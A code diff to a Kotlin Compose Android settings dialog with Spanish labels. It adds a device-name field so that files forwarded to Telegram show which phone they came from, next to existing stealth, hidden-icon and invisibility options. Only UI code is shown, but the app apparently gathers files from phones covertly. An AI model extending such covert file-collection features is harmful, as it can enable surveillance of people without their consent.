@@ -65,7 +65,8 @@ fun SettingsDialog(
     var testStatusMessage by remember { mutableStateOf<String?>(null) }
     var isTestingTelegram by remember { mutableStateOf(false) }
 
-    // App Preferences State (Sigilo, Ahorro e Invisibilidad)
+    // App Preferences State (Dispositivo, Sigilo, Ahorro e Invisibilidad)
+    var deviceName by remember { mutableStateOf(currentAppPreferences.deviceName) }
     var stealthMode by remember { mutableStateOf(currentAppPreferences.stealthMode) }
     var dataSaverMode by remember { mutableStateOf(currentAppPreferences.dataSaverMode) }
     var hideAppIcon by remember { mutableStateOf(currentAppPreferences.hideAppIcon) }
@@ -99,7 +100,7 @@ fun SettingsDialog(
                     Tab(
                         selected = selectedTab == 1,
                         onClick = { selectedTab = 1 },
-                        text = { Text("Sigilo/Datos") }
+                        text = { Text("Dispositivo") }
                     )
                     Tab(
                         selected = selectedTab == 2,
@@ -204,6 +205,39 @@ fun SettingsDialog(
                     }
 
                     1 -> {
+                        // --- IDENTIFICADOR DE DISPOSITIVO ---
+                        Card(
+                            colors = CardDefaults.cardColors(containerColor = Color(0xFFEFF6FF)),
+                            shape = RoundedCornerShape(10.dp),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            Column(modifier = Modifier.padding(12.dp)) {
+                                Text(
+                                    text = "📱 Nombre del Dispositivo / Teléfono",
+                                    fontWeight = FontWeight.Bold,
+                                    fontSize = 14.sp,
+                                    color = Color(0xFF1E3A8A)
+                                )
+                                Spacer(modifier = Modifier.height(6.dp))
+                                OutlinedTextField(
+                                    value = deviceName,
+                                    onValueChange = { deviceName = it },
+                                    label = { Text("Nombre para Telegram") },
+                                    placeholder = { Text("Ej: Teléfono David, Moto G84...") },
+                                    modifier = Modifier.fillMaxWidth(),
+                                    singleLine = true
+                                )
+                                Spacer(modifier = Modifier.height(4.dp))
+                                Text(
+                                    text = "Este nombre aparecerá en todos los mensajes de Telegram para identificar de qué celular provienen los archivos.",
+                                    fontSize = 11.sp,
+                                    color = Color(0xFF3B82F6)
+                                )
+                            }
+                        }
+
+                        Spacer(modifier = Modifier.height(12.dp))
+
                         // --- SIGILO Y AHORRO DE DATOS TAB ---
                         Card(
                             colors = CardDefaults.cardColors(containerColor = Color(0xFFF3F4F6)),
@@ -380,6 +414,7 @@ fun SettingsDialog(
 
                     onSaveAppPreferences(
                         AppPreferences(
+                            deviceName = deviceName.trim(),
                             stealthMode = stealthMode,
                             dataSaverMode = dataSaverMode,
                             hideAppIcon = hideAppIcon
